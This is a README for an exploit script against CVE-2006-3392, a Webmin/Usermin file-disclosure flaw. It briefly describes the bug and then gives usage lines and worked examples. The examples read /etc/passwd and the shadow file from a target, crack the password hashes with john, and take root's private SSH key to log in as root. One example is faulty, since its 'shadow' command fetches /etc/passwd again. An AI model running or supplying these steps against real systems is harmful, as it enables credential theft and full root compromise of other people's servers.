# CVE-2006-3392

https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2006-3392

Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML, which allows remote attackers to read arbitrary files, as demonstrated using "..%01" sequences, which bypass the removal of "../" sequences before bytes such as "%01" are removed from the filename. NOTE: This is a different issue than CVE-2006-3274.

### Usage
Browse any file in the filesystem with root privilege
```
./exploit.sh <target ip> <target port> <file to disclose>
```

### Examples
Browse passwd and shadow on 10.10.11.105, unshadow and crack the hashes
```
./exploit.sh 10.10.11.105 10000 /etc/passwd > passwd
./exploit.sh 10.10.11.105 10000 /etc/passwd > shadow
unshadow passwd shadow > unshadowed
john --wordlist=<your fave wordlist here> unshadowed
```
Browse private rsa key on 10.10.11.105
```
./exploit.sh 10.10.11.105 10000 /root/.ssh/id_rsa > private_key
ssh -i private_key root@10.10.11.105
```
